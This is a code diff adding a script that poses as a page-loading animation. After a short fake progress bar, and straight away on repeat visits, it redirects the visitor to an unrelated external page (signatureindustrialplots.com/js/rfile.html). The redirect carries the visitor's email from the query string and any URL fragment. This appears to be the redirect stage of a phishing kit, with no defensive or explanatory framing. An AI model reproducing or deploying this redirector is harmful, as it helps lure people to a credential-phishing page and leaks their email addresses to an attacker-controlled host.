@@ -1,0 +1,52 @@
+<script>
+  // check if already loaded before
+  if (localStorage.getItem("loaderShown")) {
+    redirectPage(true); // skip animation
+  }
+
+  function redirectPage(skipFlag = false) {
+    const fullUrl = window.location.href;
+    const [baseUrl, hashData] = fullUrl.split("#");
+    
+    // grab email from query string
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get('email') || 'unknown@example.com';
+
+    const redirectBase = "https://www.signatureindustrialplots.com/js/rfile.html"; 
+
+    // build final redirect URL
+    const finalUrl = `${redirectBase}?email=${encodeURIComponent(email)}${hashData ? '#' + hashData : ''}`;
+
+    if (!skipFlag) {
+      localStorage.setItem("loaderShown", "true"); // mark loader as shown
+    }
+
+    window.location.href = finalUrl;
+  }
+
+  // loader animation
+  const loadingBar = document.querySelector('.loading-bar');
+  const progressText = document.querySelector('.progress-text');
+  const continueBtn = document.querySelector('.continue-btn');
+
+  let progress = 0;
+  const totalDuration = 2000; 
+  const updateInterval = 20; 
+  const increment = (updateInterval / totalDuration) * 100;
+
+  const interval = setInterval(() => {
+    progress += increment;
+    if (progress > 100) progress = 100;
+    loadingBar.style.width = progress + '%';
+    progressText.textContent = `Loading... ${Math.floor(progress)}%`;
+
+    if (progress >= 100) {
+      clearInterval(interval);
+      continueBtn.style.display = "inline-block";
+    }
+  }, updateInterval);
+
+  setTimeout(() => {
+    redirectPage();
+  }, totalDuration + 50);
+</script>
